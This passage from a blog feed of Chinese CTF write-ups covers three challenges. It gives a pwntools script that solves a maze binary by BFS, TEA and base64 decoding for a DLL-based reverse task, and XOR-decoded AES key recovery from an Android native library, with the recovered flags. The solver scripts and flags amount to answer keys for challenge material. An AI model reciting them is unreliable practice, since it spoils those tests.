class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013B</span>F                 call    function_541</span><br><span class="line">.text:<span class="number">00000000000013</span>C4                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013</span>C9                 call    function_205</span><br><span class="line">.text:<span class="number">00000000000013</span>CE                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013</span>D3                 call    function_297</span><br><span class="line">.text:<span class="number">00000000000013</span>D8                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013</span>DD                 call    function_175</span><br><span class="line">.text:<span class="number">00000000000013E2</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013E7</span>                 call    function_331</span><br><span class="line">.text:<span class="number">00000000000013</span>EC                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013F</span>1                 call    function_287</span><br><span class="line">.text:<span class="number">00000000000013F</span>6                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000013F</span>B                 call    function_938</span><br><span class="line">.text:<span class="number">0000000000001400</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001405</span>                 call    function_413</span><br><span class="line">.text:<span class="number">000000000000140</span>A                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000140F</span>                 call    function_934</span><br><span class="line">.text:<span class="number">0000000000001414</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001419</span>                 call    function_1000</span><br><span class="line">.text:<span class="number">000000000000141</span>E</span><br><span class="line">.text:<span class="number">000000000000141</span>E loc_141E:                               ; CODE XREF: function_0+<span class="number">38</span>↑j</span><br><span class="line">.text:<span class="number">000000000000141</span>E                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001423</span>                 call    main</span><br><span class="line">.text:<span class="number">0000000000001428</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000001429</span>                 leave</span><br><span class="line">.text:<span class="number">000000000000142</span>A                 retn</span><br><span class="line">.text:<span class="number">000000000000142</span>A ; &#125; <span class="comment">// starts at 1358</span></span><br><span class="line">.text:<span class="number">000000000000142</span>A function_0      endp</span><br></pre></td></tr></table></figure><p>转换为伪代码大致如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tmp++;</span><br><span class="line"><span class="keyword">switch</span>(<span class="built_in">read_num</span>())&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>: <span class="built_in">function_541</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>: <span class="built_in">function_205</span>();</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;10&quot;</span> <span class="built_in">function_1000</span>();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">main</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从function_0 ~ function_999都能跳转到其它的十个函数，我们的目标是要在第1000步的时候走到function_1000从而获得flag</p><p><img src="https://c.img.dasctf.com/images/2022328/1648459651632-e43916dd-4a40-46e7-b20f-b2168a0b429e.png" class="lazyload" data-srcset="https://c.img.dasctf.com/images/2022328/1648459651632-e43916dd-4a40-46e7-b20f-b2168a0b429e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>但是这里可以发现在每一个switch内只要default就会返回main函数，那么我们其实只需要找到一条长度小于1000的路径，然后一直default去填充tmp就好了</p><p>寻找最短路径可以采用bfs算法，那我们只需要知道1000个函数每个函数可以跳转到那些函数就好了，但是由于每一次的maze都是随机生成的且超过20秒就会直接Alarm clock,所以我们不能通过IDA来直观的得知程序的构造，而是需要我们手动分析hex view来得到程序的构造</p><p>分析Hex View主要分析的就是<code>call</code>指令</p><p><code>call</code>指令占5个字节,如<code>00000000000013BF                 call    function_541</code> 在 Hex View 中为<code>\x00\x01\xbd\x7b\xe8</code>(这里为大端序), <code>\xe8</code>可以理解为标志位,<code>\x00\x01\xbd\x7b</code>为地址到跳转函数的<code>00000000000013BF</code>偏移,而这里每一个函数的偏移为0xd3，这里就可以通过偏移来算出<code>call</code>指令所指向的函数</p><p>这里得注意下这里得偏移是有符号数，所以在计算的时候需要将其转换</p><p>最后，在得到表之后，用bfs算法得到路径，最后得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1447</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pass_proof</span>():</span><br><span class="line"><span class="built_in">dir</span> = string.ascii_letters + string.digits <span class="comment">#生成24个字母和十个数</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] sha256(XXXX+&#x27;</span>)</span><br><span class="line">salt = p.recv(<span class="number">16</span>).strip().decode()<span class="comment">#strip() 方法用于移除字符串头尾指定的字符（/n)</span></span><br><span class="line">   <span class="comment">#decode() 方法以 encoding 指定的编码格式解码字符串。默认编码为字符串编码。</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = p.recv(<span class="number">64</span>).strip().decode()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">rand_str = (<span class="string">&#x27;&#x27;</span>.join([random.choice(<span class="built_in">dir</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])) + salt</span><br><span class="line"><span class="keyword">if</span> sha256(rand_str.encode()).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line"><span class="built_in">print</span>(rand_str[:<span class="number">4</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;[+] Plz Tell Me XXXX :&#x27;</span>, rand_str[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_elf</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;map :\n&quot;</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">&#x27;That\&#x27;s all\n&#x27;</span>,drop=<span class="literal">True</span>)[:-<span class="number">1</span>]</span><br><span class="line">data=base64.b64decode(data)</span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">&#x27;pwnpwn&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fd.write(data)</span><br><span class="line">fd.close()</span><br><span class="line"></span><br><span class="line">pass_proof()</span><br><span class="line">get_elf()</span><br><span class="line"></span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./pwnpwn&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">offset = <span class="number">0x13C0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_map</span>(<span class="params">fd,offset</span>):</span><br><span class="line">Map = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">addr = offset</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">fd.seek(addr)</span><br><span class="line">fc = u64(fd.read(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> fc &lt;= <span class="number">0x33765</span>: <span class="comment">#整个迷宫函数的长度</span></span><br><span class="line">fc = fc//<span class="number">0xd3</span> + i + <span class="number">1</span> <span class="comment">#oxd3是func度</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">fc = fc - <span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">if</span> fc &gt; -<span class="number">0xd3</span>:</span><br><span class="line">fc = i</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> addr+fc &lt; <span class="number">0x134A</span>: <span class="comment">#func1000</span></span><br><span class="line">fc = <span class="number">1000</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">fc = fc//<span class="number">0xd3</span></span><br><span class="line">fc = i+<span class="number">1</span>+fc</span><br><span class="line">Map.append(fc)</span><br><span class="line">addr += <span class="number">0xa</span> <span class="comment">#case的长度</span></span><br><span class="line">offset += <span class="number">0xd3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Map</span><br><span class="line">Map = get_map(fd,offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_bfs</span>(<span class="params">Map</span>):</span><br><span class="line">values = []</span><br><span class="line">keys = [] </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">   <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">   values.append([])</span><br><span class="line">   values[y].append(Map[x + y * <span class="number">10</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">keys.append(i)</span><br><span class="line">result = <span class="built_in">dict</span>(<span class="built_in">zip</span>(keys,values)) <span class="comment">#两个列表合并成一个字典</span></span><br><span class="line">result[<span class="number">1000</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line">result1 = <span class="literal">None</span></span><br><span class="line">q = [(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)]</span><br><span class="line">check_map = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(q):</span><br><span class="line">f = q[<span class="number">0</span>]</span><br><span class="line">q = q[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> f[<span class="number">0</span>] == <span class="number">1000</span>:</span><br><span class="line">result1 = f[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> f[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> check_map:</span><br><span class="line">check_map[f[<span class="number">0</span>]] = f[<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">if</span> result[f[<span class="number">0</span>]][i] <span class="keyword">not</span> <span class="keyword">in</span> check_map:</span><br><span class="line">q.append((result[f[<span class="number">0</span>]][i],f[<span class="number">1</span>]+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">return</span> result1</span><br><span class="line">result = do_bfs(Map)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">result = <span class="built_in">str</span>(result)</span><br><span class="line">times = <span class="number">999</span> - <span class="built_in">len</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">p.sendline(<span class="string">&quot;11&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(result[i])+<span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -DAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FFunction</title>
      <link href="/2022/07/18/FFunction/"/>
      <url>/2022/07/18/FFunction/</url>
      
        <content type="html"><![CDATA[<p>  ida打开my_plugin.dll</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207182325376.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207182325376.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。 第⼀个参数的值是输⼊经过位置变换然后base64</p><p>第二个参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0x1ECA101B060</span> - <span class="number">0x1ECA101B0B0</span> (<span class="number">80</span> bytes) :</span><br><span class="line">[<span class="number">0x5C15754C</span>, <span class="number">0xD1D781E7</span>, <span class="number">0x501BF173</span>, <span class="number">0xCB4DB222</span>, <span class="number">0x215D61F5</span>, <span class="number">0x3FCA9EE7</span>, <span class="number">0x7C76B5C7</span>, <span class="number">0xC7DD8CB9</span>, <span class="number">0x990D23FA</span>, <span class="number">0x0BAB1AD3</span>, <span class="number">0x8E12C932</span>, <span class="number">0xD307BAF2</span>, <span class="number">0xE52DD123</span>, <span class="number">0xFBB68F2C</span>, <span class="number">0xBDD853E3</span>, <span class="number">0x892E1E4E</span>, <span class="number">0x39DD66FA</span>, <span class="number">0x87FEEC65</span>, <span class="number">0x307C5E60</span>, <span class="number">0x340C6C00</span>]</span><br></pre></td></tr></table></figure><p>tea解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(UINT32 *v, UINT32 *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> n = <span class="number">32</span>, sum, y = v[<span class="number">0</span>], z = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x79B99E37</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">while</span> (n-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        z += ((y &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        y += ((z &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (z + sum) ^ ((z &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = y;</span><br><span class="line">    v[<span class="number">1</span>] = z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UINT32 key[<span class="number">4</span>] = &#123;<span class="number">0x0BABEC0FE</span>,</span><br><span class="line">                     <span class="number">0x0DEADBEEF</span>,</span><br><span class="line">                     <span class="number">0x0FACEB00C</span>,</span><br><span class="line">                     <span class="number">0xDEADC0DE</span>&#125;;</span><br><span class="line">    UINT32 enc[<span class="number">21</span>] = &#123;<span class="number">1544910156</span>, <span class="number">3520561639</span>, <span class="number">1344008563</span>, <span class="number">3410866722</span>,</span><br><span class="line">                      <span class="number">559768053</span>, <span class="number">1070243559</span>, <span class="number">2088154567</span>, <span class="number">3353185465</span>,</span><br><span class="line">                      <span class="number">2567775226</span>, <span class="number">195762899</span>, <span class="number">2383595826</span>, <span class="number">3540499186</span>,</span><br><span class="line">                      <span class="number">3844985123</span>, <span class="number">4223045420</span>, <span class="number">3185071075</span>, <span class="number">2301501006</span>,</span><br><span class="line">                      <span class="number">970811130</span>, <span class="number">2281630821</span>, <span class="number">813456992</span>, <span class="number">873229312</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">2</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">4</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">6</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">8</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">10</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">12</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">14</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">16</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">18</span>, key);</span><br><span class="line">    <span class="built_in">Decrypt</span>(enc + <span class="number">20</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span> * <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, ((<span class="type">char</span> *)enc)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再经过base64解码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;30014006400460044007500230035008600c400a600e6003600c300930016004300340025004400d7007500250086002600f5006300050083007400e3000500a600840055007400970033001600e500a&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ccc=re.<span class="built_in">findall</span>(<span class="string">&quot;.&#123;2&#125;&quot;</span>,a)</span><br><span class="line">ccc=[<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i in ccc]</span><br><span class="line">fl=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> index in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ccc),<span class="number">2</span>):</span><br><span class="line">    fl+=(<span class="built_in">chr</span>(ccc[index]+ccc[index+<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(fl[::<span class="number">-1</span>])</span><br><span class="line"><span class="built_in">print</span>(base64.<span class="built_in">b64decode</span>(fl[::<span class="number">-1</span>]).<span class="built_in">decode</span>())</span><br></pre></td></tr></table></figure><p>还原</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;f&#125;l!a!gC&#123;_Ehmtp10ww_erre_tFt1u&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">f1=<span class="string">&quot;&quot;</span></span><br><span class="line">f2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> index in <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> index%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        f1+=flag[index]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2+=flag[index]</span><br><span class="line"><span class="built_in">print</span>(f1+f2)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Emp0wer_F1&#125;!!C_ht1w_rettu</span><br></pre></td></tr></table></figure><p>再把后部分逆序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Emp0wer_F1utter_w1th_C!!&#125;</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/FW-ltlly/p/16487550.html">dsctf2022 wp - FW_ltlly - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -[dll] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>catchme</title>
      <link href="/2022/07/18/catchme/"/>
      <url>/2022/07/18/catchme/</url>
      
        <content type="html"><![CDATA[<p> 主要check函数在native层里面</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181221161.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181221161.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ida打开so文件,findcrypto找到aes加密，定位到主要加密函数 sub_B2A4</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181222736.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181222736.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>先是一个aes然后是base64</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181230898.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181230898.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>很多的反调试，但是可以直接静态解，aes的key和最后的比较函数都经过异或加密</p><p>加密函数datadiv_decode2726420793510661260()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x4F</span>, <span class="number">0x1C</span>, <span class="number">0x36</span>, <span class="number">0x49</span>, <span class="number">0x09</span>, <span class="number">0x3A</span>, <span class="number">0x3F</span>, <span class="number">0x07</span>, <span class="number">0x4D</span>, <span class="number">0x3D</span>, <span class="number">0x22</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x4A</span>, <span class="number">0x1B</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=<span class="number">0x6C</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">b=[<span class="number">0x24</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x21</span>, <span class="number">0x35</span>, <span class="number">0x26</span>, <span class="number">0x3F</span>, <span class="number">0x37</span>, <span class="number">0x32</span>, <span class="number">0x2A</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x53</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i]^=<span class="number">0x53</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>比较的字符串：#pZ%eVSk!QNUlfNIjemL&amp;w&#x3D;&#x3D;</p><p>aes的密钥：wonderfulday!!!!</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181241464.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207181241464.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>解密得到flag</p><p>flag{weu&#x2F;.,iopl}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -[native] -[android] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LOADER</title>
      <link href="/2022/07/14/LOADER/"/>
      <url>/2022/07/14/LOADER/</url>
      
